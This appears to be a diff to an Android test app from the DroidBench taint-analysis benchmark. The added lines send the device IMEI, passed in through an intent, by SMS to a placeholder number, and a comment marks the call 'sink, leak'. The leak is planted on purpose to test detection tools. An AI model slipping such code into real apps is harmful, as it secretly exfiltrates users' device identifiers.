@@ -3,6 +3,7 @@ package edu.mit.icc_action_string_operations;
 import android.app.Activity;
 import android.content.Intent;
 import android.os.Bundle;
+import android.telephony.SmsManager;
 import android.util.Log;
 
 /*
@@ -18,6 +19,8 @@ public class IsolateActivity extends Activity
 		
 		Intent i = getIntent();
 		String imei = i.getStringExtra("DroidBench");
+		SmsManager sms = SmsManager.getDefault();
+		sms.sendTextMessage("+49 1234", null, imei, null, null); //sink, leak
 		Log.i("DroidBench", imei);
 	}
 	
